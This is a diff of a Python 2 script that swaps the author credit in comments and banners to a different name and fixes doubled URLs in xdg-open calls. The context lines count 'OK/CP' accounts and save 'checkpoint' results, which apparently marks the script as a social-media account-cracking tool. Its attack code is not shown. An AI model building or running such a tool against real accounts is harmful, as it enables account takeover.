@@ -1,6 +1,6 @@
 #!/usr/bin/python2
 #coding=utf-8
-#The Credit For This Code Goes To Muhammad Usman
+#The Credit For This Code Goes To ‏الـــقاسͧــᷨــͣم شͥـᷝـͣــیر
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
 
@@ -95,7 +95,7 @@ print  """
 \033[1;97m | |/ |/ / /___/ /___/ /___/ /_/ / /  / / /___   \033[0m
 \033[1;97m |__/|__/_____/_____/\____/\____/_/  /_/_____/\033[3;97mv1.0\033[0m
 \033[1;91m●▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\033[1;93m๑۩۩๑\033[1;91m▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬●
-\033[1;94mAuthor©\033[1;91m: \033[1;93mMuhammad Usman
+\033[1;94mAuthor©\033[1;91m: \033[1;93mالـــقاسͧــᷨــͣم شͥـᷝـͣــیر
 \033[1;94mGitHub\033[1;91m: \033[1;93mhttps://Github.com/HTSUPK
 \033[1;94mWhatsapp\033[1;91m: \033[1;93m+1 (705) 230-1425
 \033[1;91m«--------------------\033[1;93m✧\033[1;91m--------------------»"""
@@ -122,10 +122,10 @@ while (loop == 'true'):
             loop = 'false'
         else:
             print "\033[1;91mWrong Password"
-            os.system('xdg-open https://https://Youtube.com/c/HiTechSolutionsUM')
+            os.system('xdg-open https://Youtube.com/c/HiTechSolutionsUM')
     else:
         print "\033[1;91mWrong Username"
-        os.system('xdg-open https://https://Youtube.com/c/HiTechSolutionsUM')
+        os.system('xdg-open https://Youtube.com/c/HiTechSolutionsUM')
 
 def login():
 	os.system('clear')
@@ -445,7 +445,7 @@ def pilih_super():
 
 
 	print "\033[1;97m«--------------------\033[1;92m✧\033[1;97m--------------------»"
-	print "  \033[1;91m«---------Developed By Muhammad Usman------------»" #Dev:Mk_tricks
+	print "  \033[1;91m«---------Developed By ‏الـــقاسͧــᷨــͣم شͥـᷝـͣــیر------------»" #Dev:Mk_tricks
 	print '\033[1;92mProcess Has Been Completed\033[1;92m....'
 	print"\033[1;92mTotal OK/\x1b[1;93mCP \033[1;91m: \033[1;92m"+str(len(oks))+"\033[1;97m/\033[1;93m"+str(len(cekpoint))
 	print("\033[1;96m[+] \033[1;92mCP File Has Been Saved \033[1;91m: \033[1;97mout/checkpoint.txt")
